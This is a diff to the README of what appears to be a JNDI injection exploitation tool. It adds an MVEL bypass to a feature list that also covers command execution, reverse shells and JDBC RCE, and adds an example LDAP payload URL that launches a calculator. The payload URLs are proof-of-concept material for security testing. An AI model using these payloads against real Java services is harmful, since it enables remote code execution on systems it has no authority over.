@@ -10,7 +10,7 @@ Features
 - execute command
 - native reverse shell (Windows supported)
 - load custom class bytecode
-- Tomcat/Groovy/SnakeYaml bypass
+- Tomcat/Groovy/SnakeYaml/MVEL bypass
 - Commons DBCP/Tomcat DBCP/Tomcat JDBC/Alibaba Druid/HikariCP JDBC RCE
 - NativeLibLoader (load native library)
 - MLet (detect classes in classpath)
@@ -102,6 +102,7 @@ Use the following methods to bypass higher-version JDK restrictions, support all
 - Tomcat ELProcessor
 - Groovy ClassLoader/Shell
 - SnakeYaml
+- MVEL
 
 All of the above methods rely on BeanFactory, so the Tomcat version must be less than 8.5.79 or 9.0.63
 
@@ -115,6 +116,9 @@ ldap://127.0.0.1:1389/GroovyShell/Command/open -a Calculator
 
 # SnakeYaml Bypass
 ldap://127.0.0.1:1389/SnakeYaml/Command/open -a Calculator
+
+# MVEL Bypass
+ldap://127.0.0.1:1389/MVEL/Command/open -a Calculator
 ```
 
 ### MLet
